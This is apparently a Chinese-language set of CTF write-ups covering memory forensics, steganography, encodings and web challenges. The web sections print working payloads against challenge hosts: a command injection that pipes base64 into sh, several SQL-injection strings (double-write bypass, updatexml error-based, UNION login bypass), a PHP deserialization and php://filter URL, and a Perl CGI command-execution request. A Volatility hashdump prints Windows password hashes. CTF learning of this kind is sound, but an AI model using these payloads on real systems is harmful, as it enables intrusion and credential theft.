\Device\HarddiskVolume2\keyboard-log\t.txt

```
volatility -f "Keyboard.raw" --profile=Win7SP1x64 dumpfiles -Q 0x000000003d700880 -D ./ -u
```

![image-20200830180720064](/image-20200830180720064.png)

提示abc，应该是qwe键盘解密：

```python
def search(x):
    return{'q':'a','w':'b','e':'c','r':'d','t':'e','y':'f','u':'g','i':'h','o':'i','p':'j','a':'k',
    's':'l','d':'m','f':'n','g':'o','h':'p','j':'q','k':'r',
    'l':'s','z':'t','x':'u','c':'v','v':'w','b':'x','n':'y','m':'z',
    }.get(x,x)
def main():
    print("QWE键盘解密程序")
    print("请输入待解密的字符串：")
    while True:
        try:
            miwen=input()
            miwen=miwen.lower()
            print("结果是：")
            for i in miwen:
                print(search(i),end='')
            print("\n")
        except:
            break

if __name__=="__main__":
    main()
```

veracryptpasswordiskeyboarddraobyek

将该密码转为大写后加载磁盘

![image-20200830181322001](/image-20200830181322001.png)

解压vhd文件，得到一个假flag。文件夹名称提示But I hid it，用winhex检查ntfs流发现flag：

![image-20200830182454145](/image-20200830182454145.png)

###### 8.mem

```
volatility -f "mem.data" imageinfo
```

Win7SP1x64

```
volatility -f "mem.data" --profile=Win7SP1x64 pslist
```

mspaint

```
volatility -f "mem.data" --profile=Win7SP1x64 memdump -p 2768 --dump-dir=./
```

后缀名改为data，用gimp，加了透明通道后调了一万年终于发现flag：

![image-20200830185146469](/image-20200830185146469.png)

###### 9.memory

本题要求获得用户Administrator的密码。

```
volatility -f "memory" imageinfo
```

WinXPSP2x86

```
volatility -f "memory" --profile=WinXPSP2x86 hivelist
volatility -f "memory" --profile=WinXPSP2x86 hashdump -y 0xe101b008 -s 0xe1451b60 > hashs.txt
```

```
Administrator:500:0182bd0bd4444bf867cd839bf040d93b:c22b315c040ae6e0efee3518d830362b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:132893a93031a4d2c70b0ba3fd87654a:fe572c566816ef495f84fdca382fd8bb:::
```

用ophcrack爆破得到flag

#### 硬盘取证

###### 1

![image-20200906193213585](/image-20200906193213585.png)

![image-20200906193218379](/image-20200906193218379.png)

![image-20200906193222614](/image-20200906193222614.png)

![image-20200906193226571](/image-20200906193226571.png)

![image-20200906193230878](/image-20200906193230878.png)

###### 2

![image-20200906193307393](/image-20200906193307393.png)

![image-20200906193311450](/image-20200906193311450.png)

![image-20200906193315942](/image-20200906193315942.png)

![image-20200906193321351](/image-20200906193321351.png)

###### 

# 强网杯2020

###### 主动

```php
<?php
highlight_file("index.php");

if(preg_match("/flag/i", $_GET["ip"]))
{
    die("no flag");
}

system("ping -c 3 $_GET[ip]");

?> 
```

用;截断，然后用base64构造cat flag.php即可：

```
ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
```

```
<!--?php $flag = "flag{I_like_qwb_web}"; -->
```

###### upload

给了个流量包，追踪tcp流发现上传了一张叫steghide.jpg的图片，写个脚本读取字典，用steghide爆破即可：

```python
import os
f = open('pass.txt')
for i in f.readlines():
    os.system('steghide extract -sf 1.jpg -p %s'%i[:-1])
```

```
flag{te11_me_y0u_like_it}
```

###### Funhash

```php+HTML
<?php
include 'conn.php';
highlight_file("index.php");
//level 1
if ($_GET["hash1"] != hash("md4", $_GET["hash1"]))
{
    die('level 1 failed');
}

//level 2
if($_GET['hash2'] === $_GET['hash3'] || md5($_GET['hash2']) !== md5($_GET['hash3']))
{
    die('level 2 failed');
}

//level 3
$query = "SELECT * FROM flag WHERE password = '" . md5($_GET["hash4"],true) . "'";
$result = $mysqli->query($query);
$row = $result->fetch_assoc(); 
var_dump($row);
$result->free();
$mysqli->close();


?> 
```

level1用0e251288019绕过，生成脚本：

```python
import hashlib
import string
import itertools
i = 0
prefix = "0e"
while 1:
	if i%1000000 == 0:
		 print prefix + str(i)
	hash1 = hashlib.new("md4", prefix + str(i)).hexdigest()
	if hash1[:2] == "0e" and  hash1[2:].isdigit():
		print prefix + str(i)
		print hash1
		exit()
	i += 1
```

level2用数组配合0e绕过：

```
hash2[]=1&hash3[]=0e
```

level3用ffifdyop绕过

```
http://39.101.177.96/index.php?hash1=0e251288019&hash2[]=1&hash3[]=0e&hash4=ffifdyop
```

```
array(3) { ["id"]=> string(1) "1" ["flag"]=> string(24) "flag{y0u_w1ll_l1ke_h4sh}" ["password"]=> string(32) "641ec1386cb6a65f6831a48be12c8ad1" } 
```

# 钓鱼城杯2020

###### whitespace

有两种空格，需要进行替换

![image-20200906205208447](/image-20200906205208447.png)

把两种空格分别替换成1和0:

![image-20200906205256640](/image-20200906205256640.png)

然后转换为字符串拼起来就好：

```
s = s.split('\n')
for i in s:
    if i != '1':
        print(chr(int(i,2)), end = '')
```

```
flag{nyrdXZESDMz1l5N8837AYZb7STPHCveg}
```

# 高校战“疫”2020

###### 简单MISC

给了一个jpg图片和一个压缩包，jpg图片用foremost得到一个压缩包：

![image-20200906211808051](/image-20200906211808051.png)

解压后发现为摩斯密码：

```
./.--./../-.././--/../-.-./.../../-/..-/.-/-/../---/-./---/..-./..-/-./../...-/./.-./.../../-/-.--/.--/.-/.-.
```

解码一下：

```python
a = './.--./../-.././--/../-.-./.../../-/..-/.-/-/../---/-./---/..-./..-/-./../...-/./.-./.../../-/-.--/.--/.-/.-.'
s = a.split("/")
dict = {'.-': 'A',
        '-...': 'B',
        '-.-.': 'C',
        '-..':'D',
        '.':'E',
        '..-.':'F',
        '--.': 'G',
        '....': 'H',
        '..': 'I',
        '.---':'J',
        '-.-': 'K',
        '.-..': 'L',
        '--': 'M',
        '-.': 'N',
        '---': 'O',
        '.--.': 'P',
        '--.-': 'Q',
        '.-.': 'R',
        '...': 'S',
        '-': 'T',
        '..-': 'U',
        '...-': 'V',
        '.--': 'W',
        '-..-': 'X',
        '-.--': 'Y',
        '--..': 'Z',
        '.----': '1',
        '..---': '2',
        '...--': '3',
        '....-': '4',
        '.....': '5',
        '-....': '6',
        '--...': '7',
        '---..': '8',
        '----.': '9',
        '-----': '0',
        '..--..': '?',
        '-..-.': '/',
        '-.--.-': '()',
        '-....-': '-',
        '.-.-.-': '.'
        }
for item in s:
    print (dict[item],end='')
```

```
EPIDEMICSITUATIONOFUNIVERSITYWAR
```

作为解压密码用来解压得到一串base字符串：

```
VGgxc19pc19GbGFHX3lvdV9hUkVfcmlnSFQ=
```

CTFcrack进行base64解码得到flag:

```
Th1s_is_FlaG_you_aRE_rigHT
```

# xtcf

## web

###### i-got-id-200

Perl（.pl）站文件上传

```
POST /cgi-bin/file.pl?/bin/bash%20-c%20ls${IFS}/| HTTP/1.1
Host: 220.249.52.133:45874
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------312623419042421556082293855654
Content-Length: 492
Origin: http://220.249.52.133:45874
Connection: close
Referer: http://220.249.52.133:45874/cgi-bin/file.pl
Cookie: PHPSESSID=0g8sp3lq2esm31ss6265g37l77
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

-----------------------------312623419042421556082293855654
Content-Disposition: form-data; name="file";
Content-Type: application/octet-stream

ARGV
-----------------------------312623419042421556082293855654
Content-Disposition: form-data; name="file"; filename="test.py"
Content-Type: text/plain

-----------------------------312623419042421556082293855654
Content-Disposition: form-data; name="Submit!"

Submit!
-----------------------------312623419042421556082293855654--
```

```
POST /cgi-bin/file.pl?/flag HTTP/1.1
Host: 220.249.52.133:45874
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------312623419042421556082293855654
Content-Length: 492
Origin: http://220.249.52.133:45874
Connection: close
Referer: http://220.249.52.133:45874/cgi-bin/file.pl
Cookie: PHPSESSID=0g8sp3lq2esm31ss6265g37l77
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

-----------------------------312623419042421556082293855654
Content-Disposition: form-data; name="file";
Content-Type: application/octet-stream

ARGV
-----------------------------312623419042421556082293855654
Content-Disposition: form-data; name="file"; filename="test.py"
Content-Type: text/plain

-----------------------------312623419042421556082293855654
Content-Disposition: form-data; name="Submit!"

Submit!
-----------------------------312623419042421556082293855654--
```

# buuctf

## web

###### [极客大挑战 2019]BabySQL

双写绕过注入，需要换库。

密码随便填，从账号处注入。

```
-1' ununionion selselectect 1,2,3-- -

-1' ununionion selselectect 1,group_concat(schema_name),3 frfromom infoorrmation_schema.schemata-- -

-1' uniounionn seleselectct 1,group_concat(table_name),3 frfromom infoorrmation_schema.tables whwhereere table_schema='ctf'-- -

-1' uniunionon selselectect 1,group_concat(column_name),3 ffromrom infoorrmation_schema.columns whewherere table_name='Flag'-- -

-1' ununionion selselectect 1,(selselectect flag frfromom ctf.Flag limit 1),3-- -
```

###### [ZJCTF 2019]NiZhuanSiWei

三个参数，text需要绕过`file_get_contents`；file需要绕过`preg_match`，且有`include`可以利用；password用于反序列化。

`file_get_contents`使用data://text/plain;base64绕过；由于给了提示`useless.php`，不需绕过`preg_match`，利用php://filter/read=convert.base64-encode/resource=在`include`读取`useless.php`源码即可；最后根据`useless.php`的源码构造反序列化即可。

读取useless.php源码：

```
http://2806c537-e61d-44c4-a3c3-4be94f9a3200.node3.buuoj.cn/index.php?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php
```

构造反序列化：

```php
<?php  

class Flag{  //flag.php  
    public $file = "flag.php";  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  


$s = new Flag();
var_dump(serialize($s));
?>
```

读取flag：

```
http://2806c537-e61d-44c4-a3c3-4be94f9a3200.node3.buuoj.cn/index.php?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}
```

###### [极客大挑战 2019]HardSQL

过滤了union，故使用updatexml进行报错注入。

使用like代替=

使用^代替and

使用括号代替空格

使用right代替substr

```
1'^updatexml(1,concat(0x23,database()),1)%23^'1

1'^updatexml(1,concat(0x23,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like'geek'))),1)%23^'1

1'^updatexml(1,concat(0x23,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like'H4rDsq1'))),1)%23^'1

1'^updatexml(1,concat(0x23,(select(password)from(H4rDsq1))),1)%23^'1

1'^updatexml(1,concat(0x23,(select(right(password,30))from(H4rDsq1))),1)%23^'1
```

###### [GXYCTF2019]BabySQli

F12发现search.php，访问后F12发现一串base字符串，一次base32一次base64解密后得到：

```
select * from user where username = '$name'
```

可以利用查询不存在的数据，配合联合查询构造临时数据，绕过密码验证：

```
name: 1'+union+select+1,'admin','e10adc3949ba59abbe56e057f20f883e'#
pw:123456
```

## misc

###### [WUSTCTF2020]find_me

右键查看备注发现是八点盲文，找不到离线工具，在线搞定了：

https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen

###### [GUET-CTF2019]KO

```
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!
Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook!
Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook?
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.
Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.
Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook?
Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!
Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.
Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.
Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook. Ook? Ook.
```

```
#!/usr/bin/env python
#
# an Ook! interpreter written in python
#
# you can wrap the memory pointer to the end of the the memory cells
# but you cannot do the same trick to get the first cell, since going
# further out would just initiate a new memory cell.
#
#
# 2003-02-06: Thanks to John Farrell for spotting a bug!

import sys, string, types

def massage(text):
    ret = []
    tok = []

    for line in text:
        if line[0] != ";" and line != "\n" and line != "":
            for token in line.split(" "):
                if token != "":
                    ret.append(token.strip())
    return ret

def sane(code):
    if len(code) % 2 == 0:
        return 1
    else:
        return 0

class OokInterpreter:

    memory = [0]
    memptr = 0
    file   = None
    code   = None
    len    = 0
    codei  = 0

    def __langinit(self):
        self.lang   = {'Ook. Ook?' : self.mvptrup,
                       'Ook? Ook.' : self.mvptrdn,
                       'Ook. Ook.' : self.incptr,
                       'Ook! Ook!' : self.decptr,
                       'Ook. Ook!' : self.readc,
                       'Ook! Ook.' : self.prntc,
                       'Ook! Ook?' : self.startp,
                       'Ook? Ook!' : self.endp}

    def mem(self):
        return self.memory[self.memptr]

    def __init__(self, file):
        self.__langinit()
        self.file = open(file)
        self.code = massage(self.file.readlines())
        self.file.close()
        if not sane(self.code):
            print self.code
            raise "OokSyntaxError", "Code not sane."
        else:
            self.cmds()

    def run(self):
        self.codei = 0
        self.len  = len(self.code)
        while self.codei < self.len:
            self.lang[self.code[self.codei]]()
            self.codei += 1

    def cmds(self):
        i = 0
        l = len(self.code)
        new = []
        while i < l:
            new.append(string.join((self.code[i], self.code[i+1]), " "))
            i += 2
        self.code = new

    def startp(self):
        ook = 0
        i   = self.codei
        if self.memory[self.memptr] != 0:
            return None
        while 1:
            i += 1
            if self.code[i] == 'Ook! Ook?':
                ook += 1
            if self.code[i] == 'Ook? Ook!':
                if ook == 0:
                    self.codei = i
                    break
                else:
                    ook -= 1
            if i >= self.len:
                raise 'OokSyntaxError', 'Unmatched "Ook! Ook?".'

    def endp(self):
        ook = 0
        i   = self.codei
        if self.memory[self.memptr] == 0:
            return None
        if i == 0:
            raise 'OokSyntaxError', 'Unmatched "Ook? Ook!".'
        while 1:
            i -= 1
            if self.code[i] == 'Ook? Ook!':
                ook += 1
            if self.code[i] == 'Ook! Ook?':
                if ook == 0:
                    self.codei = i
                    break
                else:
                    ook -= 1
            if i <= 0:
                raise 'OokSyntaxError', 'Unmatched "Ook? Ook!".'

    def incptr(self):
        self.memory[self.memptr] += 1

    def decptr(self):
        self.memory[self.memptr] -= 1

    def mvptrup(self):
        self.memptr += 1
        if len(self.memory) <= self.memptr:
            self.memory.append(0)

    def mvptrdn(self):
        if self.memptr == 0:
            self.memptr = len(self.memory) - 1
        else:
            self.memptr -= 1

    def readc(self):
        self.memory[self.memptr] = ord(sys.stdin.read(1))

    def prntc(self):
        sys.stdout.write(chr(self.mem()))


if __name__ == '__main__':
    o = OokInterpreter(sys.argv[1])
    o.run()
```

###### 我吃三明治

给了张图片，用formost能分解成两张图片但是啥都没发现。

回去查看原图的二进制，发现两张图中间有点一段数据：

![image-20200927112121964](/image-20200927112121964.png)

用CyberChef的base32解密得到flag，其他程序会报错解不开原因不明。

###### [DDCTF2018](╯°□°）╯︵ ┻━┻

给了一串字符串：

```
d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd
```

分割移动位得到flag：

```
string = "d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd" 
string1 = "" 
for i in range(0, len(string), 2):
    string1 += "0x" 
    string1 += string[i] 
    string1 += string[i+1] 
    string1 += "," 
string1 = string1[:-1] 
print string1 
string2 = [] 
string2 = string1.split(",") 
print string2 
flag = "" 
for i in range(len(string2)): 
    flag += chr(int(string2[i],16)-128) 
print(flag)
```

###### 百里挑一

把流量包中的http文件全部导出，用exiftool找到前半flag：

```
exiftool ./new/*|grep flag
```

后一半在114个tcp流中

###### [SUCTF2018]single dog

给了一张图片

![img](/clip_image001.jpg)

formost得到一个压缩包

![img](/clip_image002.png)

解压后：

![img](/clip_image004.jpg)

aaencode：

![img](/clip_image006.jpg)

###### [WUSTCTF2020]alison_likes_jojo

As we known, Alison is a pretty girl.

给了两张图片：

![img](/clip_image001.png)

发现boki.jpg中有压缩包：

![img](/clip_image002-1602750309015.png)

爆破得到密码：

![img](/clip_image003.png)

解压得到base字符串：

![img](/clip_image004.png)

base64处理两次：

![img](/clip_image005.png)

![img](/clip_image006.png)

![img](/clip_image007.png)

作为密码，用outguess得到flag：

![img](/clip_image008.png)

###### [ACTF新生赛2020]swp

给了个流量包，发现有个压缩文件：

![img](/clip_image002.jpg)

伪加密，ZipCenOp处理下，得到swp文件：

![img](/clip_image004-1602750333875.jpg)

![img](/clip_image005-1602750333876.png)

![img](/clip_image007.jpg)

## crypto

###### Url编码

![img](/clip_image002-1602750556841.jpg)

![img](/clip_image004-1602750556841.jpg)

###### 一眼就解密

下面的字符串解密后便能获得flag：ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30= 注意：得到的 flag 请包上 flag{} 提交

![img](/clip_image001-1602750571756.png)

###### password

```
姓名：张三 
生日：19900315

key格式为key{xxxxxxxxxx}
```

```
flag{zs19900315}
```

###### 变异凯撒

```
加密密文：afZ_r9VYfScOeO_UL^RWUc
格式：flag{ }
```

```
_str='afZ_r9VYfScOeO_UL^RWUc'#需要解密的字符串

string_new = ''
for i in range(len(_str)):
    num = ord(_str[i])
    num = (num + (5 + i)) % 128
    string_new += chr(num)
print(string_new)
```

# 2020哔哩哔哩安全挑战赛

###### 第一题：页面的背后是什么？

提示bilibili Security Browser浏览器访问，估计是改User-Agent

![image-20201026194626149](/image-20201026194626149.png)

用burpsuite修改，咦怎么是flag2。

![image-20201026194912611](/image-20201026194912611.png)

flag1其实f12就能得到，前两题共用页面没想到吧。

![image-20201026195029634](/image-20201026195029634.png)

###### 第二题：真正的秘密只有特殊的设备才能看到

见第一题

###### 第三题：密码是啥？

上来给了登录框，题目提示密码是啥，果断弱口令爆破。

![image-20201026195647426](/image-20201026195647426.png)

然后字典都跑烂了都跑不出来。

最后靠脑洞猜到密码是admin/bilibili。

![image-20201026195806764](/image-20201026195806764.png)

###### 第四题：对不起，权限不足～

提示需要超级管理员，检查cookie发现role
![image-20201026200011598](/image-20201026200011598.png)

md5解密发现是user：

![image-20201026201713114](/image-20201026201713114.png)

改成admin的md5，不对，

改成root的md5，不对，

改成administrator的md5，不对，

改成Administrator的md5，总算对了。

![image-20201026201846085](/image-20201026201846085.png)

emmmm，好吧，这题还算是正常的脑洞，好歹不是master。

###### 第五题：别人的秘密

F12查看前端源码发现获取flag的js逻辑：

```
        $(function () {
        
            
            (function ($) {
                $.getUrlParam = function(name) {
                    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
                    var r = window.location.search.substr(1).match(reg);
                    if (r != null) return unescape(r[2]); return null;
                }
            })(jQuery);
        
            var uid = $.getUrlParam('uid');
            if (uid == null) {
                uid = 100336889;
            }
            $.ajax({
                url: "api/ctf/5?uid=" + uid,
                type: "get",
                success:function (data) {
                    console.log(data);
                    if (data.code == 200){
                        // 如果有值：前端跳转
                        $('#flag').html("欢迎超级管理员登陆～flag : " + data.data )
                    } else {
                        // 如果没值
                        $('#flag').html("这里没有你想要的答案～")
                    }
                }
            })
        });
```

看来要爆破uid，老习惯从0开始，但是爆到1000也没出感觉不对，难道又是脑洞？

2233、114514,都试了一下也不对，感觉这个思路不太行。

突然想起默认uid是100336889，难道从这个uid开始爆破？

![image-20201026202513504](/image-20201026202513504.png)

好吧，真的是，第一次见到管理员不是个位数id的。

顺便，这个uid主页长这样的：

![image-20201026202816988](/image-20201026202816988.png)

没关注没粉丝没动态还被禁封了可还行。